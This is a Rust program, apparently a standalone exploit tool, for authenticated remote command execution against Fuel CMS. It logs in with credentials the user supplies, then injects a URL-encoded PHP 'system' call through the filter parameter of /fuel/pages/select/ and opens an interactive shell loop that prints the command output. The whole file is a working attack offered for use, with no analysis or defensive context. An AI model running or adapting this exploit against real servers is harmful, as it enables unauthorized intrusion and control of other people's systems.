use reqwest::Client;
use anyhow::Result;
use std::io::{self, Write};
use url::Url;

fn print(value: &str) {
    print!("{}",value);
    io::stdout().flush().unwrap();
}

fn read_input(input_buffer: &mut String, std_in_io: &io::Stdin) -> Result<String, anyhow::Error> {
    std_in_io.read_line(input_buffer)?;
    Ok(input_buffer.trim().to_owned())
}

#[tokio::main]
async fn main() -> Result<(), anyhow::Error> {
    let hclient = Client::builder()
        .cookie_store(true)
        .build()?;

    let mut read_buffer = String::new();
    let in_buffer = io::stdin();
    let clean_buff = |x: &mut  String| { x.clear(); };

    print("[+] target ip: ");
    //in_buffer.read_line(&mut read_buffer)?;
    let ip = read_input(&mut read_buffer, &in_buffer).unwrap();

    clean_buff(&mut read_buffer);
    
    print("[+] username: ");
    //in_buffer.read_line(&mut read_buffer)?;
    let username = read_input(&mut read_buffer, &in_buffer).unwrap();
    clean_buff(&mut read_buffer);
    print("[+] password: ");
    //in_buffer.read_line(&mut read_buffer)?;
    let password = read_input(&mut read_buffer, &in_buffer).unwrap();
    clean_buff(&mut read_buffer);

    println!("{},{},{}", ip, username, password);

    let auth_url = format!("http://{}/fuel/login/5a6e566c6243396b59584e6f596d3968636d513d", ip);
    let form_data = [("user_name", username), ("password", password), ("Login","Login".to_string()), ("forward","5a6e566c6243396b59584e6f596d3968636d513d".to_string())];

    let res = hclient.post(auth_url)
        .form(&form_data)
        .send()
        .await?
        .text()
        .await?;

    if res.contains("dashboard") {
        println!("[+] login bem sucedido");
    }

    loop {

        print("[+] $ ");
        in_buffer.read_line(&mut read_buffer)?;
        if read_buffer.eq("exit\n") {
            break;
        }

        let payload = format!("http://{}{}{}{}",ip,"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27",read_buffer,"%27%29%2b%27");
        let parsed_payload = Url::parse(&payload).unwrap();

        let exploit_resp = hclient.get(parsed_payload)
            .send()
            .await?
            .text()
            .await?;

        let offset = (&exploit_resp[851..]).to_string();
        
        let bind_set = offset.find("\n\n").unwrap() + 851;

        print(&format!("offset limite: {}\n",bind_set));

        println!("{}", &exploit_resp[851..bind_set]);

        clean_buff(&mut read_buffer);
    }
    Ok(())
}
